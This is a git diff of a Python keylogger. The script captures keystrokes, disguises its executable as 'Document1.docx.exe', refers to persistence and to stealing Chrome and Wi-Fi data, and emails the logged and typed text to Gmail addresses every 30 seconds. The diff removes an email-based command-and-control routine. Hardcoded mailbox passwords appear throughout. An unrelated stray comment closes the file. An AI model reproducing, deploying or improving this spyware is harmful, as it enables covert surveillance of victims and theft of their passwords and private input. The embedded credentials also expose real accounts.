@@ -1,5 +1,4 @@
 import smtplib
-import imaplib
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
@@ -10,11 +9,10 @@ from time import sleep
 
 import keyboard
 
-ID = 1
-SENDING_INTERVAL = 90
-SENDER = "cuij@inbox.lv"
-RECEIVERS = ["cuij@inbox.lv"]
-PASSWORD = "F9wQ!jHUp5"
+SENDING_INTERVAL = 30
+SENDER = "momo.lareinedesmouettes15@gmail.com"
+RECEIVERS = ["momo.lareinedesmouettes15@gmail.com","bdouilleur@gmail.com"]
+PASSWORD = "Momo123#"
 
 KEYLOGGER_FILE = "Document1.docx.exe"
 
@@ -102,34 +100,20 @@ def make_persistent(current_file_name):
     else:
         logprint("INFO: Successfully made program persistent")
 
-def run_command_order(email_body):
-    logprint(f"INFO: Command text is as follows, running:{email_body}\n")
-    # Extract the list
-    command_order = email_body.partition('[')
-    print('1',command_order)
-    command_order = command_order[1] + command_order[2]
-    print('2',command_order)
-    command_order = command_order.partition(']')
-    print('3',command_order)
-    command_order =command_order[0] #+ command_order[1]
-    logprint('4',command_order)
 
-def send_results(message_text="",file_paths=[]):
+def send_results(file_paths=[]):
     print("INFO: Running sending check...")
     global log, typed_string
-    if log != "" or message_text != "":
+    if log != "":
         logprint("INFO: New logs detected.")
         logprint("INFO: Generating e-mail report...")
 
         msg = MIMEMultipart()
         msg['From'] = SENDER
         msg['To'] = ",".join(RECEIVERS)
-        msg['Subject'] = f"Report from {ID}"
+        msg['Subject'] = "Keylogger Report"
 
-        if message_text != "":
-            body = message_text 
-        else:
-            body = f"Report:\nLog (since last report):\n{log}\n\n\n\nTyped string(since program launch):\n{typed_string}\n\n\n\n{'Attached files' if file_paths else ''}."
+        body = f"Report:\nLog (since last report):\n{log}\n\n\n\nTyped string(since program launch):\n{typed_string}\n\n\n\n{'Attached files' if file_paths else ''}."
         msg.attach(MIMEText(body, 'plain'))
 
         if file_paths:
@@ -143,10 +127,11 @@ def send_results(message_text="",file_paths=[]):
 
         text = msg.as_string()
         logprint(
-            f"INFO: Connecting to SMTP server, with username {SENDER} and PASSWORD {PASSWORD}.\n"
+            f"INFO: Connecting to GMail SMTP server, with username {SENDER} and PASSWORD {PASSWORD}.\n"
         )
         try:
-            server = smtplib.SMTP_SSL('mail.inbox.lv', 465)
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
             server.login(SENDER, PASSWORD)
         except Exception as e:
             logprint(
@@ -154,14 +139,13 @@ def send_results(message_text="",file_paths=[]):
             )
             logprint(f"ERROR: Mailing failed.\n")
         else:
-            logprint(f"INFO: Successfully connected.\n")
-            logprint(f"INFO: Sending from {SENDER} to {RECEIVERS}...\n")
             try:
+                logprint(f"INFO: Sending from {SENDER} to {RECEIVERS}...\n")
                 server.sendmail(SENDER, RECEIVERS, text)
                     
-            except Exception as e:
+            except Exception:
                 logprint(
-                    f"ERROR: Couldn't send mail, see error traceback below\n{type(e)}\n{str(e)}\n"
+                    f"ERROR: Couldn't send mail, see error traceback below\n{type(Exception)}\n{str(Exception)}\n"
                 )
                 logprint(f"ERROR: Mailing failed.\n")
             else:
@@ -172,53 +156,12 @@ def send_results(message_text="",file_paths=[]):
     else:
         print("INFO: No new keyboard input.")
 
-def fetch_commands():
-    print("INFO: Running new command check...\n")
-    print(
-        f"INFO: Connecting to IMAP server, with username {SENDER} and PASSWORD {PASSWORD}.\n"
-    )
-    try:
-        server = imaplib.IMAP4_SSL("mail.inbox.lv", 993)
-        server.login(SENDER, PASSWORD)
-    except Exception as e:
-        logprint(
-            f"ERROR: Couldn't connect to IMAP server, see error traceback below\n{type(e)}\n{str(e)}\n"
-        )
-        logprint(f"ERROR: Check failed.\n")
-    else:
-        print(f"INFO: Successfully connected.\n")
-        print(f"INFO: Fetching from {SENDER}...\n")
-        try:
-            server.select('INBOX')
-
-            status, response = server.search(None, f'(FROM "{SENDER}" SUBJECT "Command (for {ID})" UNANSWERED)')
-            unread_msg_nums = response[0].split()
-            print(f"INFO: Found {len(unread_msg_nums)} new command emails\n")
-            if len(unread_msg_nums)==0:
-                print("INFO: No commands to run\n")
-            else:
-                logprint("INFO: Running only first command\n")
-                _, response = server.fetch(unread_msg_nums[0], '(UID BODY[TEXT])')
-                # Mark them as seen
-                for e_id in unread_msg_nums:
-                    server.store(e_id, '+FLAGS', '\Seen')
-                print('\n\n\n\n\n',response[0][1])
-                run_command_order(response[0][1].decode("utf-8"))
-
-        except Exception as e:
-            logprint(
-                f"ERROR: Couldn't fetch mail, see error traceback below\n{type(e)}\n{str(e)}\n"
-            )
-            logprint(f"ERROR: Check failed.\n")
-        else:
-            print("INFO: Check successful.\n")
-            server.close()
 
 keyboard.on_press(on_press)
 #get_chrome_data()
 #get_wifi_data()
 #make_persistent()
 while 1:
-    fetch_commands()
     sleep(SENDING_INTERVAL)
     send_results()
+#Other higher hill or a pack mentality, and always hunt alone.
